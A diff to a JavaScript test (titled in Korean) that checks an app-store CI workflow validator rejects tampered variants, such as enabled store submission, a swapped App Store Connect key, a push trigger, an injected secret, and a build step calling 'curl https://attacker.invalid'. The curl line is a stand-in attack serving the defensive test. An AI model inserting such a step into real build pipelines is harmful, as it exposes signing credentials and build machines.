@@ -166,7 +166,7 @@ test('스토어 작업은 승인된 블록 그대로일 때만 통과하고 심�
   const lastManual = approvedWorkflow.lastIndexOf('events: []');
   for (const invalid of [
     approvedWorkflow.replace('submit_to_app_store: false', 'submit_to_app_store: true'),
-    approvedWorkflow.replace('app_store_connect: upturnlabs-asc-key', 'app_store_connect: bdr-asc-key'),
+    approvedWorkflow.replace('app_store_connect: bdr-asc-key', 'app_store_connect: unknown-asc-key'),
     approvedWorkflow.slice(0, lastManual) + 'events: [push]' + approvedWorkflow.slice(lastManual + 'events: []'.length),
     approvedWorkflow.replace('bundle_identifier: kr.co.upturnlabs.stizdasan', 'bundle_identifier: kr.co.upturnlabs.stizdasan\n        APP_STORE_CONNECT_KEY_ID: SECRET'),
     approvedWorkflow.replace('xcode-project use-profiles', 'xcode-project use-profiles\n          curl https://attacker.invalid'),
